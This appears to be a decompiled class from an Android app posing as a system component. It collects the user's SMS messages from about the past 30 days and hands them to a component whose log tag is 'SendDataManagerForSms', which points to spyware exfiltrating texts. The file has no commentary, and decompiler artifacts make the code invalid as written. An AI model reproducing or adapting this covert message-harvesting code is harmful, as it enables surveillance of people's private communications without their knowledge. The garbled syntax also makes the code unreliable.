package com.app.system.common.f;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.a.f;
import com.app.system.common.entity.Message;
import com.app.system.common.h.k;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class o
  extends a
{
  public static int a(Context paramContext, long paramLong)
  {
    try
    {
      SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
      long l = paramLong;
      if (paramLong <= 0L)
      {
        localObject1 = new java/util/Date;
        ((Date)localObject1).<init>();
        l = ((Date)localObject1).getTime() / 1000L - 2592000L;
      }
      Object localObject1 = new com/app/system/common/a/f;
      ((f)localObject1).<init>(paramContext);
      Date localDate = new java/util/Date;
      localDate.<init>((1L + l) * 1000L);
      Object localObject2 = new java/util/Date;
      ((Date)localObject2).<init>();
      localObject2 = ((f)localObject1).a(false, localDate, (Date)localObject2);
      if ((localObject2 != null) && (((List)localObject2).size() > 0))
      {
        localObject1 = new com/app/system/common/h/k;
        ((k)localObject1).<init>(paramContext);
        localObject2 = ((List)localObject2).iterator();
        for (paramLong = 0L; ((Iterator)localObject2).hasNext(); paramLong = paramContext.c())
        {
          label135:
          paramContext = (Message)((Iterator)localObject2).next();
          if ((paramContext == null) || (paramContext.c() <= l)) {
            break label135;
          }
          ((k)localObject1).a(paramContext);
        }
        if (paramLong > 0L)
        {
          paramContext = new java/util/Date;
          paramContext.<init>();
          localEditor.putLong("last-sms-date", paramContext.getTime() / 1000L);
          localEditor.commit();
        }
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.d("SendDataManagerForSms", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/f/o.class
 *
 * Reversed by:           J
 */